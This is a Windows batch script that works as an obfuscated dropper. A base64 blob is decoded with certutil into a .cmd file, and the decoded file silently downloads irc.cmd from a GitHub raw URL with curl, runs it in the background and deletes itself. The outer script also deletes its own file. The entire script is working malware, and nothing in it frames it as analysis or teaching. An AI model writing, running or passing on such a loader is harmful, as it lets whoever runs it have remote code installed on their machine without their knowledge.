@echo off
set x=(set /p =.)
set d0=QGVjaG8gb2ZmDQplY2hvICJMb2FkaW5nIg0KY3VybCAtbyBpbnN0LmNtZCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3JhY2ttYW4yL2lyY19tY2dlZS9tYXN0ZXIvdXBkYXRlL2lyYy5jbWQgLXMNCmNscw0KdGltZW91dCAvVCAxID4gbnVsDQpzdGFydCAvQiBpbnN0LmNtZA0KZGVsICUw
echo.
set en=%CD%\enf.txt
<nul (set /p =%d0%) >> %en%
certutil -decode %en% "%CD%\Mb2FkaW5nI.cmd" > nul 
del %en%
"Mb2FkaW5nI.cmd"
del %0
